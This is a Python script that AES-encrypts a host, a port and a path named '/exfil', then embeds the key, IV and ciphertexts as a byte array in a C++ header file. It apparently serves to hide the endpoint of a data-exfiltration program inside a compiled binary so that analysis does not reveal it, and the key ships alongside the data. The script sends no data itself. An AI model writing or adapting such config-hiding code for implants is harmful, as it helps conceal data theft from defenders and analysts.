from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto.Random import get_random_bytes
import base64

# === STEP 1: Generate a proper AES-256 key (32 bytes) ===
key = get_random_bytes(32)
base64_key = base64.b64encode(key).decode()

# === CONFIGURATION ===
host = "127.0.0.1"
port = "80"
path = "/exfil"

# === IV ===
iv = get_random_bytes(16)

# === ENCRYPT FUNCTION ===
def encrypt(plaintext: str) -> bytes:
    cipher = AES.new(key, AES.MODE_CBC, iv)
    padded = pad(plaintext.encode(), AES.block_size)
    return cipher.encrypt(padded)

# === ENCRYPT FIELDS ===
enc_host = encrypt(host)
enc_port = encrypt(port)
enc_path = encrypt(path)

# === STRUCTURE FOR C++ OUTPUT ===
# [32 bytes key] [16 bytes IV] [1B len_host] [enc_host] [1B len_port] [enc_port] [1B len_path] [enc_path]

binary_blob = (
    key +
    iv +
    bytes([len(enc_host)]) + enc_host +
    bytes([len(enc_port)]) + enc_port +
    bytes([len(enc_path)]) + enc_path
)

# === WRITE TO C++ FRIENDLY FILE ===
cpp_array = ", ".join(f"0x{b:02X}" for b in binary_blob)
cpp_output = f"// AES-256 key (base64): {base64_key}\nunsigned char embedded_config[] = {{ {cpp_array} }};\n"

with open("config_blob.h", "w") as f:
    f.write(cpp_output)

base64_key  # Show the base64 version of the AES key
